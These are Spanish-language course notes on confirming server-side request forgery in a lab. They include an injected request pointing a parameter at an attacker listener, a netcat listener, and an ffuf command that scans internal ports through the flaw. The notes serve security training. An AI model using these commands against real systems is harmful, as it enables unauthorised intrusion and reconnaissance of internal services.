# Módulo 07 — Server-side Attacks

## Sección 3/19: Identifying SSRF

> [!NOTE]
> Confirmar SSRF requiere identificar un punto donde la app hace un request server-side controlado por un parámetro del usuario, y luego apuntar ese parámetro a un servidor propio para verificar que el request efectivamente llega. Una vez confirmado, la vulnerabilidad puede escalarse a un **port scan interno** completo del servidor.

## 🛠️ Confirmando SSRF

**Paso 1 — apuntar el parámetro a un servidor propio:**

```
POST /index.php
dateserver=http://172.17.0.1:8000/ssrf&date=...
```

**Paso 2 — levantar un listener y verificar la conexión entrante:**

```bash
nc -lnvp 8000
```

```
listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 38782
GET /ssrf HTTP/1.1
Host: 172.17.0.1:8000
```

Recibir la conexión confirma la SSRF.

## 🛠️ SSRF ciego vs no ciego

> [!TIP]
> Apuntar el parámetro al propio servidor (`http://127.0.0.1/index.php`) y observar si la respuesta HTTP devuelve el contenido de esa página. Si la respuesta refleja ese contenido, la SSRF **no es ciega**. Si no refleja nada, la SSRF es **ciega** (blind).

## 🛠️ Enumerando el sistema: port scanning vía SSRF

Si se puede inferir de la respuesta si un puerto está abierto o cerrado (mensaje de error identificable), la SSRF se puede usar para escanear puertos internos.

```bash
seq 1 10000 > ports.txt

ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
  -fr "Failed to connect to"
```

- `-fr "Failed to connect to"`: filtra (excluye) respuestas que contengan ese mensaje de error, dejando visibles solo los puertos abiertos

Resultado (ejemplo):
```
[Status: 200, Size: 45] * FUZZ: 3306
[Status: 200, Size: 8285] * FUZZ: 80
```

> [!WARNING]
> Un puerto abierto como 3306 (MySQL) revela servicios internos normalmente no accesibles desde fuera. Si hubiera otras aplicaciones web internas en otros puertos, la misma SSRF permitiría identificarlas y acceder a ellas.

## 🧠 Quiz de repaso

<details>
<summary>¿Por qué es importante determinar si una SSRF es ciega o no antes de intentar explotarla más a fondo?</summary>

Porque determina qué tipo de información se puede extraer directamente. Con SSRF no ciega, se puede leer el contenido completo de la respuesta del recurso interno, acelerando el reconocimiento. Con SSRF ciega, solo se puede inferir información indirecta — por ejemplo, si el tiempo de respuesta o un mensaje de error genérico cambia según el estado del recurso — lo cual requiere más trabajo pero sigue siendo explotable.

</details>

<details>
<summary>¿Por qué usar el mensaje de error de conexión como criterio de filtrado es más confiable que basarse solo en el código de estado HTTP?</summary>

Porque en muchos casos la respuesta HTTP externa siempre devuelve el mismo código de estado (ej. 200 OK) independientemente de si el puerto interno estaba abierto o cerrado. El contenido específico del mensaje de error es lo que realmente distingue un intento fallido de uno exitoso, por lo que filtrar por ese texto es más preciso que confiar en el código de estado HTTP externo.

</details>

> [!NOTE]
> **Ejercicio práctico (lab)** — El lab pide explotar la SSRF para identificar una aplicación web interna y acceder a ella para obtener la flag. Metodología: confirmar la SSRF apuntando `dateserver` a un servidor propio, luego usar la técnica de port scanning con `ffuf` filtrando el mensaje de error de conexión para descubrir puertos internos abiertos, y finalmente apuntar `dateserver` al puerto descubierto para acceder al contenido de esa app interna y leer la flag. No se documenta la flag específica del lab, solo el enfoque.

## 🔗 Relacionado
- [02 — Introduction to SSRF](02-introduction-to-ssrf.md)
- [04 — Exploiting SSRF](04-exploiting-ssrf.md)
- [05 — Blind SSRF](05-blind-ssrf.md)

#cwes #modulo07 #server-side-attacks #ssrf #port-scanning #ffuf
